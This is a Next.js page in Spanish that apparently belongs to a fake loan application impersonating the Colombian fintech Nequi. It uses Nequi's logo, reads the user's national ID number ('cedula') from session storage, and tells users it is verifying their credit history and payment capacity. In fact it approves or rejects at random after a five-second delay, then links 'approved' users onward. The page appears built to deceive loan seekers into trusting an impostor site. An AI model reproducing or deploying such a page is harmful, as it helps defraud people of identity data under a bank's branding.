'use client'

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import Image from "next/image"
import LoadingSpinner from "../components/loading-spinner"
import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { useRouter } from "next/navigation"

export default function ProcesandoPage() {
  const [status, setStatus] = useState<'processing' | 'approved' | 'rejected'>('processing')
  const router = useRouter()

  useEffect(() => {
    const checkStatus = async () => {
      const cedula = sessionStorage.getItem('cedula')
      // Aquí deberías implementar una función para verificar el estado del préstamo
      // Por ahora, simularemos una respuesta después de 5 segundos
      await new Promise(resolve => setTimeout(resolve, 5000))
      setStatus(Math.random() > 0.5 ? 'approved' : 'rejected')
    }

    checkStatus()
  }, [])

  return (
    <main className="min-h-screen bg-white">

       {/* Navbar */}
       <nav className="relative z-10 bg-white shadow-sm px-4 py-2">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <Image
            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
            alt="Nequi Logo"
            width={120}
            height={40}
            priority
          />
          <Button 
            variant="ghost" 
            onClick={() => window.location.reload()}
            className="bg-[#E6007E] hover:bg-[#C4006B] text-white rounded-md px-4 py-2"
          >
            Recargar
          </Button>
        </div>
      </nav>

      <div className="container mx-auto px-4 py-8 max-w-3xl">
        <div className="flex justify-center mb-8">
          <Image
            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
            alt="Nequi Logo"
            width={150}
            height={50}
            priority
          />
        </div>

        <Card className="shadow-lg border-2">
          <CardHeader className="text-center pb-2">
            <CardTitle className="text-2xl font-manrope">
              {status === 'processing' ? 'Procesando tu solicitud' : 
               status === 'approved' ? '¡Felicitaciones! Tu solicitud fue aprobada' : 
               'Lo sentimos, tu solicitud no fue aprobada'}
            </CardTitle>
          </CardHeader>
          <CardContent className="text-center space-y-6 pt-4">
            {status === 'processing' ? (
              <>
                <div className="flex flex-col items-center gap-4">
                  <LoadingSpinner size="lg" />
                  <div className="space-y-2">
                    <p className="text-lg font-medium text-[#200020]">
                      Estamos validando tu información
                    </p>
                    <p className="text-gray-600">
                      Este proceso puede tardar unos minutos. Por favor, no cierres esta ventana.
                    </p>
                  </div>
                </div>
                <div className="bg-gray-50 p-4 rounded-lg">
                  <h3 className="font-medium mb-2">Mientras esperas:</h3>
                  <ul className="text-sm text-gray-600 space-y-1">
                    <li>• Verificamos tu historial crediticio</li>
                    <li>• Evaluamos tu capacidad de pago</li>
                    <li>• Preparamos tu oferta personalizada</li>
                  </ul>
                </div>
              </>
            ) : status === 'approved' ? (
              <>
                <div className="flex justify-center">
                  <div className="bg-green-100 p-3 rounded-full">
                    <svg className="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                </div>
                <div className="space-y-4">
                  <p className="text-lg text-gray-700">
                    Tu crédito ha sido pre-aprobado. En breve recibirás un mensaje con los siguientes pasos.
                  </p>
                  <a
                    href="http://redirect.nequi.co/propeller?_ga=2.183392037.223030828.1738021257-931538480.1737406899"
                    className="block bg-[#E6007E] hover:bg-[#C4006B] text-white px-8 py-2 rounded-xl"
                  >
                    Continuar
                  </a>
                </div>
              </>
            ) : (
              <>
                <div className="flex justify-center">
                  <div className="bg-red-100 p-3 rounded-full">
                    <svg className="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                  </div>
                </div>
                <div className="space-y-4">
                  <p className="text-lg text-gray-700">
                    En este momento no podemos aprobar tu solicitud. Te invitamos a intentarlo nuevamente en unos dias.
                  </p>
                  <Button 
                    onClick={() => router.push('/')}
                    className="bg-[#E6007E] hover:bg-[#C4006B] text-white px-8 py-2 rounded-xl"
                  >
                    Volver al inicio
                  </Button>
                </div>
              </>
            )}
          </CardContent>
        </Card>
      </div>
    </main>
  )
}
